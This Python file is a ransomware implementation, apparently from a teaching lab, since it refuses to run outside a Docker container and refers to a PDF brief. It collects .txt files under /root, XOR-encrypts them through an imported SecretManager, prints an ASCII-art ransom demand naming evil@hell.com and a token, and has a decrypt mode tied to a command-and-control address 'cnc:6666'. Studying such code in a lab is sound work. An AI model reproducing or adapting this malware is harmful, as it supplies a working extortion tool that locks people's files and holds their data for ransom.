import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        HOSTNAME = socket.gethostname()
        RESULT = re.match("[0-9a-f]{6,6}", HOSTNAME)
        if RESULT is None:
            print(f"You must run the malware in docker ({HOSTNAME}) !")
            sys.exit(1)

    def get_files(self, filter:str)->list:
        # return all files matching the filter
        return list(Path("/root").glob(filter))

    def encrypt(self):
        FILES = self.get_files("*.txt")
        SECRET_MANAGER = SecretManager()
        SECRET_MANAGER.setup()
        SECRET_MANAGER.xorfiles(FILES)

        TOKEN = SECRET_MANAGER.get_hex_token()
        print(ENCRYPT_MESSAGE.format(TOKEN.hex()))
        
        

    def decrypt(self):
        # main function for decrypting (see PDF) try exept to catch the exception if the token is not valid
        try:
            # ask the user for the key
            KEY = input("Enter the key: ")
            # call set_key  & the the xorfile function
            SECRET_MANAGER = SecretManager(CNC_ADDRESS)
            SECRET_MANAGER.set_key(KEY)
            FILES = self.get_files("*.txt")
            for FILE in FILES:
                SECRET_MANAGER.xorfile(FILE)
            #call the clean function
            SECRET_MANAGER.clean()
            # print the message & leave the program
            print("Your files have been decrypted")
            sys.exit(0)
        except Exception as e:
            # print the error message & go back to the main function
            print("Invalid token")
            self.decrypt()

    

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        RANSOMWARE = Ransomware()
        RANSOMWARE.encrypt()
    elif sys.argv[1] == "--decrypt":
        RANSOMWARE = Ransomware()
        RANSOMWARE.decrypt()
